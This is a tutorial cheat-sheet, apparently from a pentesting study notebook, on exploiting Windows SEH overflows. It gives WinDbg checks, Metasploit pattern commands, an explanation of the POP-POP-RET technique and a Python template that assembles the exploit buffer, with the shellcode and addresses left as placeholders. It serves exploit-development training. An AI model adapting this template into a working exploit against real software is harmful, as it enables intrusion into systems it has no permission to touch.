---
tags:
  - Advanced
  - Binary_Exploitation
  - Debugging
  - Exploitation
  - SEH_Overflow
  - WinDbg
  - Windows
---

## SEH Overflow Exploitation
resources: [Corelan SEH Exploits](https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/)

> Exploit SEH overwrites by controlling the exception handler pointer and triggering an exception.

### SEH Overflow vs Stack Overflow [Knowledge]
> [!info] SEH overwrites target the exception handler chain instead of the return address:
> - **Stack Overflow**: Overwrite return address, gain control at function return
> - **SEH Overflow**: Overwrite SEH handler, gain control when exception is triggered

### Identify SEH Overwrite
> Check if crash involves SEH.

```text
0:000> !exchain
0012f234: 41414141           ; Handler overwritten with 'AAAA'
Invalid exception stack at 41414141
```

### Determine Offset to SEH
> Use pattern to find exact offset.

```bash
msf-pattern_create -l <Length>
```

### Find SEH Offset
> After crash, get offset from handler value.

```bash
msf-pattern_offset -l <Length> -q <HandlerValue>
```

> **Note**: nSEH is 4 bytes before handler. If handler offset is 1000, nSEH offset is 996.

### SEH Exploit Structure [Knowledge]
> Layout of SEH overflow payload.

```text
[Padding][nSEH][Handler][Shellcode]
    |      |      |         |
    |      |      |         +-- Actual shellcode
    |      |      +------------ P/P/R gadget address
    |      +------------------- Short jump to shellcode
    +-------------------------- Fills buffer to reach SEH
```

### Verify SEH Control
> Confirm control over both nSEH and handler.

```python
offset_to_nseh = <Offset>
buffer = b"A" * offset_to_nseh
buffer += b"B" * 4      # nSEH - should see 42424242
buffer += b"C" * 4      # Handler - should see 43434343
buffer += b"D" * 100    # After SEH
```

### Check in WinDbg
> Verify overwrite after crash.

```text
0:000> !exchain
0012f234: 43434343           ; Handler = CCCC
Invalid exception stack at 42424242  ; nSEH = BBBB
```

### Why P/P/R? [Knowledge]
> When exception occurs, EstablisherFrame points to our SEH record.

```text
1. Exception triggers
2. Handler called with EstablisherFrame pointing to nSEH
3. EstablisherFrame is at ESP+8 when handler runs
4. POP; POP; RET sequence:
   - POP removes first value from stack
   - POP removes second value (now ESP at EstablisherFrame)
   - RET jumps to address at ESP (our nSEH)
5. nSEH contains short jump to shellcode
```

### Construct SEH Exploit
> Build the complete exploit payload.

```python
import struct

offset_to_nseh = <Offset>

# Short jump: JMP SHORT +6 (EB 06)
# Jumps over handler address to shellcode
nseh = b"\xeb\x06\x90\x90"      # JMP +6, NOP, NOP

# P/P/R gadget address (little endian)
handler = struct.pack("<I", <PPRAddress>)

# Shellcode (after handler)
shellcode = b"\x90" * 16        # NOP sled
shellcode += b""                # msfvenom payload

# Build buffer
buffer = b"A" * offset_to_nseh
buffer += nseh
buffer += handler
buffer += shellcode
```

### Short Jump Calculation [Knowledge]
> The short jump (EB xx) is relative to the next instruction.

```text
nSEH:     EB 06 90 90    ; JMP +6 bytes forward
Handler:  XX XX XX XX    ; 4 bytes (P/P/R address)
Landing:  90 90 ...      ; Shellcode starts here

Jump is: current position (2) + 6 = 8 bytes from nSEH start
This lands just after the handler address
```

### Trigger Exception
> [!tip] After overwriting SEH, trigger an exception to call handler:
> - Access violation (writing past buffer)
> - Explicit crash (read from invalid address)
> - Integer overflow / divide by zero

